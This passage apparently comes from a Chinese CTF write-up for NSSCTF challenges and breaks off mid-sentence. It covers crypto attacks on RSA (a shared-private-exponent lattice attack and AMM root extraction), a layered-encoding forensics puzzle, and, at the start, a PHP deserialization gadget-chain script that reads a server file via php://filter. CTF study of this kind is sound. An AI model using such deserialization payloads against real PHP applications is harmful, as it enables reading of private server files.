+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class NISA&#123;</span><br><span class="line">    public $fun=&quot;mrl64&quot;;</span><br><span class="line">    public $txw4ever=&quot;echo new SplFileObject(\&quot;php://filter/convert.base64-encode/resource=/fllllllaaag\&quot;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">class TianXiWei&#123;</span><br><span class="line">    public $ext;</span><br><span class="line">    public $x=&quot;sixsixsix&quot;;</span><br><span class="line">&#125;</span><br><span class="line">class Ilovetxw&#123;</span><br><span class="line">    public $huang;</span><br><span class="line">    public $su;</span><br><span class="line">&#125;</span><br><span class="line">class four&#123;</span><br><span class="line">    public $a=&quot;TXW4EVER&quot;;</span><br><span class="line">    private $fun=&#x27;abc&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$N1 = new NISA();</span><br><span class="line">$I1 = new Ilovetxw();</span><br><span class="line">$I1-&gt;su = $N1;</span><br><span class="line">$f1 = new four();</span><br><span class="line">$f1-&gt;a = $I1;</span><br><span class="line">$I2 = new Ilovetxw();</span><br><span class="line">$I2-&gt;huang = $f1;</span><br><span class="line">$T1 = new TianXiWei();</span><br><span class="line">$T1-&gt;ext = $I2;</span><br><span class="line">echo urlencode(serialize($T1));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="rrssaa1"><a href="#rrssaa1" class="headerlink" title="rrssaa1"></a>rrssaa1</h2><p>给了个exe文件，提示当明文等于明文，又给了个txt文件，里面有一个c的值。有点懵，这是rsa?</p>
+<p>后面提示可以python反编译exe文件，发现是cbc加密，并且给了iv，根据明文等于密文，我们进行如下操作：</p>
+<blockquote>
+<p>将IV作为第一组明文输入，这样异或出的就是一组0变量，再将0变量加密后的密文分组作为第二次的明文输入，这样第二组的异或出的仍是一组0变量，这样得到的密文分组和明文分组就是一样的。</p>
+</blockquote>
+<p>得到10组n、e的值，这里就很明显是共解密指数攻击了，exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">//sage</span><br><span class="line">from gmpy2 import mpz</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">def common_private_attack(instance, debug=0, algo=&quot;LLL&quot;):</span><br><span class="line">    r = len(instance)</span><br><span class="line">    instance.sort(key=lambda x: x[&#x27;n&#x27;])</span><br><span class="line">    M = isqrt(instance[r-1][&#x27;n&#x27;])</span><br><span class="line">    </span><br><span class="line">    # Build up Lattice basis B</span><br><span class="line">    B = zero_matrix(r+1)</span><br><span class="line">    B[0,0] = isqrt(instance[r-1][&#x27;n&#x27;])</span><br><span class="line">    for i in range(1, r+1):</span><br><span class="line">        B[0,i] = instance[i-1][&#x27;e&#x27;]</span><br><span class="line">        B[i,i] = - instance[i-1][&#x27;n&#x27;]</span><br><span class="line">    if debug:</span><br><span class="line">        print(&quot;The basis of the lattice we build is:&quot;); print(B)</span><br><span class="line">       </span><br><span class="line">    </span><br><span class="line">    if algo == &quot;LLL&quot;:</span><br><span class="line">        print(&quot;Performing LLL reduction...&quot;); B = B.LLL(); print(&quot;Done.&quot;)</span><br><span class="line">    elif algo == &quot;BKZ&quot;:</span><br><span class="line">        print(&quot;Performing BKZ reduction...&quot;); B = B.BKZ(block_size=len(instance)); print(&quot;Done.&quot;)</span><br><span class="line">    </span><br><span class="line">    dM = B[0,0]; d = dM // M;</span><br><span class="line">    d = abs(d)</span><br><span class="line">    #print(&quot; dM = &#123;&#125; \n d = &#123;&#125;&quot;.format(dM, d))</span><br><span class="line"> </span><br><span class="line">    if dM % d != 0:</span><br><span class="line">        print(&quot;Fail to attack these instances.&quot;)</span><br><span class="line">    return d</span><br><span class="line"> </span><br><span class="line">instance=[&#123;&#x27;n&#x27;: 22910513874693731529794699437442585462797081074103281779720083438061943013290432867011373716709417770312374751929375184399034771058269694856532799959667041949121677104962602483584220375066079604310070170092110918929461013245513822473684968402351301685536123078521742332569393464306987452108453769431731102270963491458275901025886934456519659607039590731813386955268927981582044269612552247646692665197630976125168347209436275087984418329250553880615465123204025637362363070467484414411836736730245255823697709223006295849021945454748749818267833284501738496721945926714238227282740984681203937986318475852613929143251, &#x27;e&#x27;: mpz(418124818904584070636620437710361776090108506722591991514327934718784299737047502474085855254559869088800261398118869672209434420120317794653495668931393612406838516073527165572665005311548385479495512125271138526092300831851385800096274657668272325217430873751117716114419867692780958968593067192631486465423296524872397276474537511163042204868149575744589259544051450221302783320687258509440413868395816339688622906116768142782258988907394078830699053778292652215833104980849507933199494718914518742424146673598276155185664130838758323044619387740517935666414486691281183770077399065117822052210868255904129790857)&#125;, &#123;&#x27;n&#x27;: 24372481233234868877240458155800588580812953522873807226302786080581993950256157944642464867939762785144387544453522937931896100733484147952058102175740010137587724723034224506078443611576936256666765665550805512133208920980958204618194835347188290890392310460401576052448288739131559585387573534907086475030543828004657399151430511548607561670043211239782273890775589109913476784232834837759148258891293128608842072813994609343360665814202983846428806925879491443490368367467031496582975802337035122899501568440236021091854147442105515442233972362265981345047688567838639803532996157470683787433310033185814953656983, &#x27;e&#x27;: mpz(19143210339300240201214681568913908802203503378911354545783039851820649892001553640716724601777727911454833349588457910280062957963591589075572961361180751463216343846048742052319037925338897041933549452371741246029630187856751307559582731572601728128923668396302767081553351715263257018622487964555758751394847916982565081947216610481734739374914343623808948309951213792814166136267321554178708974135800594894999474676582468832744187994651063639342955574804522901017010028411977615943713171646182786270245242731511044090824221392904310116952767116375673790524507805832568864433094351529367145180574506758961891723713)&#125;, &#123;&#x27;n&#x27;: 24679015975199035427851554685850831633070053899857418484328145060044137550417808217226266986645286514288875260824299646109417892815567800404597047275827535258493172074535206108309907723199659370694192036854964007484633842788093367827915513408997725200824738313725110004104110062857308871076565274842616810840840810744799197704524580056030433553354133397041717795975389389238167191396628898787682599806871009262885431040360774734536368609797684355652388715712552700783779991265411167252723184924189561560018768009199749473695337780587873810629536482188724130484987746341109701417010165543419592212024193621264862157437, &#x27;e&#x27;: mpz(1887466323771244506126050040652897884230288720026513972534347995161387672855941521729593627560537130159609645850851312546802205326329236157151902749914059157236234397788369920413655818810511725066749956880552355520230065767054687221730528133402180824270938119599446091654881896367427441429406021700330179507358460436236173403829804136590987361179940109750138029351494643114058319058124904762608681397348022925627376074826811350518080031530194579924378909569680695196260687073292527268362345061093483687699693119108452554448873156890231817232965303834553227987138777939162459009424732328429033584600222583239341864361)&#125;, &#123;&#x27;n&#x27;: 20725846433298459818738516063389861157454145887412567309241971368192930248390172552460032176060600040992720084753747686885177277168920132042523397036270405823908393368295992028165872545209655962017977363348351903746731605928564721934116632473077039008788587133825619811922502829333793026171268937670512542626155796001634809633664680547300701846259322677726234892599145592757089259403977732051835633093448559478273833139316384288698135960343103244801500564407369891836897783914804945533546962961701061687990485508696254709609957808586842087409899693206392569585425380859078318139127000550432581295099509030669863867303, &#x27;e&#x27;: mpz(2363237573854087670976417969883225633360397442974401061049216894475393422244866973952932756882139865641894504435941506895224713566917990611214046823492289837152901617831851336386026240304485783973236642121278289706255550485010385013170275793369386007680778694579559138881420935348763388540214604799462174889474198144497241133628301258759734097809090228161716735359351895750148751120435424528229013305162159696839414242261305275449518850079365302566268954286580666577767306164857063096608849641777683700226797033332925301661913694775501692542844702513650655471083144015543032647455807221102876601998869281360384396969)&#125;, &#123;&#x27;n&#x27;: 22809935750576912865959231885839360732534906212225458022717669424614748661511918579549919916493236188484439882038298212760793306304545526844216353471055053556871150974522878690375438562426087440233386393370359683872593815943709353082095631111639041143754373874991575027747570017739942341766604387224176018793894754930878629709819661862381387213173036726945372240282580901124702248064018648150065273248946129523748193672656981316427317060071759239832204248176611648685460398874668097756975672168707026506110403992926074215511420161013025697858596735206101616761571190864709956992427309041192147394141071079459513490611, &#x27;e&#x27;: mpz(13133555776569547650925045548918236939639526554394889895596620269739174476566352794864343622356222299566279371551432530070481257368316784755930075662834731500502345517682356361164582999060502872211361694222132015741819795145796909591665107893860146356770485006797484186247196345168223924741037976946102849578524579606338846422314675808836631910676758185839828694899691695652500538122088029311150940192651185968892410331308490420642197863628213020528562440239348622456640781055180466849084742096007240725499537008098270708800128906741434883430906389880429863171839180158004739621168711466811317518568593570244234356473)&#125;, &#123;&#x27;n&#x27;: 22480694282480941856240478144806308314675949068465587320650365753607181629359667506510327246960059600070975543193248132715947284941641953388046978099792445163848997480222534711956558077424201889790307253643733334819206791789849391745265354084064007637913171566532460998684708503229350236485373560557693046199065144657259010989119048370619489811662974589653263692671635131186093439219165642237949026744612661967562816404233890288374130410997771410589750213626670311839445013864803976998563166191406408874373459540505835186973304663516643096962903654014842811813401296109284028861941906109336060451132312463266201415329, &#x27;e&#x27;: mpz(5624874560950753498859866139527579818312781394539479470831958979447428570824824324740771269291165645086210973103272336121731912398585096517141753168417402556661950218674390872421989641336537837013066620791238206533730906030501700325503296214297695138747177011202671679049512237059817685651828933521719416294029149562504049154660843723718018891705220638761705284473974644590524030504330156413475638165884760254514165992618015237764971157843554639068828315161344021009639686458808898375286838635679965954906305612625538770521388361497066840616893440392969988298775795541575848039950165133743457112710681254111761236977)&#125;, &#123;&#x27;n&#x27;: 24864800348158528479906787630817628786057394652940528220487672878224821093187748399176495638492155238253951061624119446159699883923429845058879913539518385471765492064482097277790223293260128881959273708226181373995800760490076615976367890263392717551259059978955019671550523682528756210608945906533001192976007098872901938952015131822528777969231670678207075524375456230663716322781932990075477736910925180207286309477685449506037405249527178078075985163439166820012435973787796791138399698319190416826416307419995704905995638505495443894477749261164124960538410932525360254583333096355932627999150017132814090333241, &#x27;e&#x27;: mpz(3856630503719827855844626836485236690181435414315645355130063964022152923723080539565019021355419177735019322219325830072037487528940021907267513161749071974608699933871793463562863522229082468683243901644845826059349596659323042299690790765030373981718166011819585074704820443905345396257414353837002151781007668563125603659889904298805297904725270532210911911226283011734773982797544816536205681843451163076486100161244600813341737446527784779893709854495658416561649974958835452357349125453415490361795100092166500410617267171431892907868601018198501626162578176872991772913847456399112257982770466218683435977233)&#125;, &#123;&#x27;n&#x27;: 19124038956715221534475664748050443644784017946285501767743851038866178811578425211712395772512764081657114249264750411100125353521253413105314358045769042565775171832528505858934347564408448715726606220509887643736405686485259106596314428705429329567823354848621662213427380804714681617624381700294984971221298888824492282135460743333840937811577196086176023601621687706265164503993591934717195202747810262431964418069040376377368805912956880604436193067845497931435910276011392268756936356824924016508042574993560735189920618883256138946496688867855672114401245107938884098540558998467042804767676383399885670917863, &#x27;e&#x27;: mpz(2526864429486600013372544534422176076310449606548856304461485276066637941365632554754458596530587265120176820669070912170194561174897463295107537549901995199720429699901644961145517761531066171228894272527951311393341049801262112401226497042253995829727117709996063274895247764121887846333559590006675066290762310586706087473986643091625437211817626727787839725750573398738378173014091184388786245327948372467755559879615874741522637847583054177607416293895012819765959700604109526983132083773582729514355334522134224212163590455593583898122500139694022270117330389492890927144273267138493069027225729811456941196841)&#125;, &#123;&#x27;n&#x27;: 22712694846618225919656596038340253703950387189307356916884965227715575385290510648357788918083042127579214343856073731099014236390909368166091091105572503659963582091256239405080287823086072151464554676361316498173485846962725704572373404896028400947773894219506964827695493355671062126899085653349150889714833678676595701733978080393121447152690832437658688817450477965220947545046095740313522911930620442467826353136237204001953779248526332341778622938019495861382365118525764027553983694265494431463871584823902011764736743452157607708114643621663013938789045186398065113397082412393217306851766751359748485479947, &#x27;e&#x27;: mpz(10677712174622673625461359647500782439433165156123940439219715020101430663583415600108354143755028037935813256146383342375176716193336557365518193617245378776772825370333872189153024262271406627376370626366265587010646777359582552203727155755566858670727867097618066172109680249978907948880949039026897280024621775610018299977269676137246768591695700091958272943505065479321506848835565663826406807954755395641654795735858484165741728341231569210806669852646070268250158341835400267707050630955072247788775265007770528881479089247519947243736784181303650218623544794991471865627967303089855830890716351172499822666657)&#125;, &#123;&#x27;n&#x27;: 29530501528048179618993188667259709438380823126457692419992781599742162976314963077892631687601059594978412657041475380032477805818407564226390560549020301725312531169814413208353912738658672008557076821628601123546429396788497410673839196924586021049176714044555896053623390330789641538577117351494577537192456906989432523245836053774828613790929239698312653550748067411624343544340442517761647170791413344362742142440328926448233820806068777032405586400091222100390759969032135228099677059219202752058583088660274632343174038249349622867356306772975206078721974271500052236762769794504351873161093377781217621800851, &#x27;e&#x27;: mpz(8729173604239025011857782023927738952041674447805777183092178780381283882428344889128776928009726731687565885792801585411233568278521882651010769203046279626441420751041892471066965129701726335998417117456164919970929625892898165284166374265463104192123359891593075186135067029442765544980841269006919805416544688157191347297531124766371177370618922502642426517831690685654226275590626523865698087716363119573077628586230380384786269088962223486145179686564375420888574395904747308189390860655468787526259462696913684329894120410714757458285565733273719525515391646880556812753596710689221817572185451401270933654073)&#125;]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">c=mpz(8249481061276641012500781695740094434470113414066017209484215230041921646049458178370330794241115341376535075017119365874406375409425518256323024908492829783852428861824372134924435528670473416419205178211753257025999328702024596957043540125702709160006013219820565345682050977792920885144964033305130028650810667051301594273570335413667926122212987004423933365573720187183851963886897210680516485876928056049295497627661890470786325640353389624242623725312661098422286151242366448450478297382717820442653339243537262050892660153070690559134669225520213623348774988576340953811305002965060069852345476309887418617950)</span><br><span class="line"> </span><br><span class="line">d=common_private_attack(instance)</span><br><span class="line">for i in range(0,11):</span><br><span class="line">    n=instance[i][&#x27;n&#x27;]</span><br><span class="line">    m1=pow(c,d,n)</span><br><span class="line">    m=long_to_bytes(m1)</span><br><span class="line">    if b&#x27;NSSCTF&#x27; in m:</span><br><span class="line">        print(m)</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        i+1</span><br></pre></td></tr></table></figure>
+
+<h2 id="rrssaa2"><a href="#rrssaa2" class="headerlink" title="rrssaa2"></a>rrssaa2</h2><p>和闽盾杯那题爆零密码一样的考法，e与phi不互质，并且需要amm开根运算，源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">import random</span><br><span class="line">import libnum</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">def gen():</span><br><span class="line">    p = 1801 * random.getrandbits(1012) + 1</span><br><span class="line">    while not isPrime(p):</span><br><span class="line">        p = 1801 * random.getrandbits(1012) + 1</span><br><span class="line">    return p</span><br><span class="line">p=gen()</span><br><span class="line">q=gen()</span><br><span class="line">e=1801</span><br><span class="line">n=p*q</span><br><span class="line">flag=&#x27;NSSCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span><br><span class="line">flag=flag+&#x27;yhe92871899hihiohh97709ujojl;lhdiwoqu903YE98Y299HDY8W9EYRW8!$$%!$!$FSR@#$@%FSEGDRYERYHRWER@$%^$^DGTW%$^&amp;GRWR@$%@FASFSFQFSTGW#TWGARWQ$@%WGVDSGADQR@%TGVDSFASDATWEGHWE%@$GSDVSFQATY$^#^%@$!RAFSDGDRTW&#x27;</span><br><span class="line"></span><br><span class="line">c = pow(m, e, n)</span><br><span class="line">print(&#x27;e=&#x27;,e)</span><br><span class="line">print(&#x27;p=&#x27;,p)</span><br><span class="line">print(&#x27;q=&#x27;,q)</span><br><span class="line">print(&#x27;c=&#x27;,c)</span><br></pre></td></tr></table></figure>
+
+<p>但是这里有个坑爹的地方，闽盾那个脚本中的k和这次的k有区别，不能直接套，因此要改下exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def cal_k(s, r):</span><br><span class="line">    R.&lt;x&gt; = PolynomialRing(GF(r))</span><br><span class="line">    f = x * s + 1</span><br><span class="line">    k = int(f.roots()[0][0])</span><br><span class="line">    print(k)</span><br><span class="line">    return k</span><br><span class="line"></span><br><span class="line"># About 3 seconds to run</span><br><span class="line">def AMM(o, r, q):</span><br><span class="line">    start = time.time()</span><br><span class="line">    print(&#x27;\n----------------------------------------------------------------------------------&#x27;)</span><br><span class="line">    print(&#x27;Start to run Adleman-Manders-Miller Root Extraction Method&#x27;)</span><br><span class="line">    print(&#x27;Try to find one &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;&#x27;.format(r, o, q))</span><br><span class="line">    g = GF(q)</span><br><span class="line">    o = g(o)</span><br><span class="line">    p = g(random.randint(1, q))</span><br><span class="line">    while p ^ ((q-1) // r) == 1:</span><br><span class="line">        p = g(random.randint(1, q))</span><br><span class="line">    print(&#x27;[+] Find p:&#123;&#125;&#x27;.format(p))</span><br><span class="line">    t = 0</span><br><span class="line">    s = q - 1</span><br><span class="line">    while s % r == 0:</span><br><span class="line">        t += 1</span><br><span class="line">        s = s // r</span><br><span class="line">    print(&#x27;[+] Find s:&#123;&#125;, t:&#123;&#125;&#x27;.format(s, t))</span><br><span class="line">    k = cal_k(s, r)</span><br><span class="line">    alp = (k * s + 1) // r</span><br><span class="line">    print(&#x27;[+] Find alp:&#123;&#125;&#x27;.format(alp))</span><br><span class="line">    a = p ^ (r**(t-1) * s)</span><br><span class="line">    b = o ^ (r*alp - 1)</span><br><span class="line">    c = p ^ s</span><br><span class="line">    h = 1</span><br><span class="line">    for i in range(1, t):</span><br><span class="line">        d = b ^ (r^(t-1-i))</span><br><span class="line">        if d == 1:</span><br><span class="line">            j = 0</span><br><span class="line">        else:</span><br><span class="line">            print(&#x27;[+] Calculating DLP...&#x27;)</span><br><span class="line">            j = - dicreat_log(a, d)</span><br><span class="line">            print(&#x27;[+] Finish DLP...&#x27;)</span><br><span class="line">        b = b * (c^r)^j</span><br><span class="line">        h = h * c^j</span><br><span class="line">        c = c ^ r</span><br><span class="line">    result = o^alp * h</span><br><span class="line">    end = time.time()</span><br><span class="line">    print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start))</span><br><span class="line">    print(&#x27;Find one solution: &#123;&#125;&#x27;.format(result))</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">def findAllPRoot(p, e):</span><br><span class="line">    print(&quot;Start to find all the Primitive &#123;:#x&#125;th root of 1 modulo &#123;&#125;.&quot;.format(e, p))</span><br><span class="line">    start = time.time()</span><br><span class="line">    proot = set()</span><br><span class="line">    while len(proot) &lt; e:</span><br><span class="line">        proot.add(pow(random.randint(2, p-1), (p-1)//e, p))</span><br><span class="line">    end = time.time()</span><br><span class="line">    print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start))</span><br><span class="line">    return proot</span><br><span class="line"></span><br><span class="line">def findAllSolutions(mp, proot, cp, p):</span><br><span class="line">    print(&quot;Start to find all the &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;.&quot;.format(e, cp, p))</span><br><span class="line">    start = time.time()</span><br><span class="line">    all_mp = set()</span><br><span class="line">    for root in proot:</span><br><span class="line">        mp2 = mp * root % p</span><br><span class="line">        assert(pow(mp2, e, p) == cp)</span><br><span class="line">        all_mp.add(mp2)</span><br><span class="line">    end = time.time()</span><br><span class="line">    print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start))</span><br><span class="line">    return all_mp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e= 1801</span><br><span class="line">p= 49610229352589717245227429186510630298995334563536199979797365135356894947505595171590737127611751124743823204969291853243936699113293137172961540731655194113111189561603261168928406442577570919901769348742992633428864861175880441682752947688509869668929473479230018031647980097396415380123118521799468844841</span><br><span class="line">q= 21081926656979729045764441706195868361643779935106260715219328461497406780587336009385210898093496090213306812904410650499587043699660339207567766840318127296396962037273317168795761421233687815992929975284592353117739413561939283754964442896468496199833988666060155459156116345763999855126020972915904618043</span><br><span class="line">c= 601596145172542477058917394071994325109856881057412872218601643742101914635753765731910337249806643258952637146341530783703613931109366648847232809553067941206928974141651198815184695746636818122414926015513095322872645068410957200062317958684872682628646759817233433643987003499153702624673493727886566639667597997520471371146056861227114668317633291934130573158877960548655006208725827943739971068608175370661619328559766977175575896437656636083179668805135271793023165492681941002853661303072959879197775224449456951125268328000206540965011249895216257583247180682482954741912101069920760903900864428405997751199</span><br><span class="line">cp = c % p</span><br><span class="line">cq = c % q</span><br><span class="line">mp = AMM(cp, e, p)</span><br><span class="line">mq = AMM(cq, e, q)</span><br><span class="line">p_proot = findAllPRoot(p, e)</span><br><span class="line">q_proot = findAllPRoot(q, e)</span><br><span class="line">mps = findAllSolutions(mp, p_proot, cp, p)</span><br><span class="line">mqs = findAllSolutions(mq, q_proot, cq, q)</span><br><span class="line">print(mps, mqs)</span><br><span class="line"></span><br><span class="line">def check(m):</span><br><span class="line">    h = m.hex()</span><br><span class="line">    if len(h) &amp; 1:</span><br><span class="line">        return False</span><br><span class="line">    if bytes.fromhex(h).startswith(b&#x27;NSSCTF&#x27;):</span><br><span class="line">        print(bytes.fromhex(h))</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># About 16 mins to run 0x1337^2 == 24196561 times CRT</span><br><span class="line">start = time.time()</span><br><span class="line">result = []</span><br><span class="line">print(&#x27;Start CRT...&#x27;)</span><br><span class="line">for mpp in mps:</span><br><span class="line">    for mqq in mqs:</span><br><span class="line">        solution = CRT_list([int(mpp), int(mqq)], [p, q])</span><br><span class="line">        if check(solution):</span><br><span class="line">            print(solution)</span><br><span class="line">            result.append(bytes.fromhex(solution.hex()))</span><br><span class="line">    print(time.time() - start)</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line">print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start))</span><br><span class="line">print(&quot;result:&quot;, result)</span><br></pre></td></tr></table></figure>
+
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h2><p>这次misc感觉就这道取证值得说道说道，其他的题不是太简单就是自己犯蠢没想出来，这题还是有一定难度的。</p>
+<p>filescan搜索，发现可疑zip文件，提取出来后里面有一个pwd.txt和一个image.rar两个文件，压缩包是加密的，密码应该就是pwd里面的内容了。</p>
+<p>pwd.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KVKFMU2NNN4HKTJSGVGWGVSWOVKVORSKKZUUCZY=</span><br></pre></td></tr></table></figure>
+
+<p>这里做了个套娃，一个base32，一个base64，而最后一个是换表base64，用CyberChef可以解除最后的密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwD_1s_h3re!</span><br></pre></td></tr></table></figure>
+
+<p>解压后发现是一堆图片，附件里还有个array.txt，同样也套了几层编码，unicode+base64+base32+hex，解出来一个数组：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32, 24,  6, 28, 15, 31,7, 23, 13, 27, 30, 33,12,  8,  5, 26, 29, 16,34, 22,  2, 14,  9, 17,21,  1, 19, 10,  4, 36,35, 25, 11, 20,  3, 18</span><br></pre></td></tr></table></figure>
+
+<p>发现刚好和图片数量吻合，应该就是拼图顺序了，可以写脚本，但是我菜不会写就手拼了，反正不多，这里贴个wp里的exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">name_list = [[32, 24, 6, 28, 15, 31],</span><br><span class="line">             [7, 23, 13, 27, 30, 33],</span><br><span class="line">             [12, 8, 5, 26, 29, 16],</span><br><span class="line">             [34, 22, 2, 14, 9, 17],</span><br><span class="line">             [21, 1, 19, 10, 4, 36],</span><br><span class="line">             [35, 25, 11, 20, 3, 18]]</span><br><span class="line">img = Image.open(&quot;./image/1.png&quot;)</span><br><span class="line">width, height = img.size</span><br><span class="line">crop_width = width * 6</span><br><span class="line">crop_height = height * 6</span><br><span class="line"></span><br><span class="line">image = Image.new(&#x27;RGB&#x27;, (crop_width, crop_height))</span><br><span class="line"></span><br><span class="line"># 利用循环将所有图片拼接到创建的新图片上</span><br><span class="line">for i in range(0,6):</span><br><span class="line">    for j in range(0,6):</span><br><span class="line">        name = str(name_list[i][j]) + &quot;.png&quot;</span><br><span class="line">        s_image = Image.open(&quot;./image/&quot; + name)</span><br><span class="line">        box2 = (width * j, height * i, width * (j + 1), height * (i + 1))</span><br><span class="line">        image.paste(s_image, box2)</span><br></pre></td></tr></table></figure>
+
+<p>拼完后能得到一个字符串：</p>
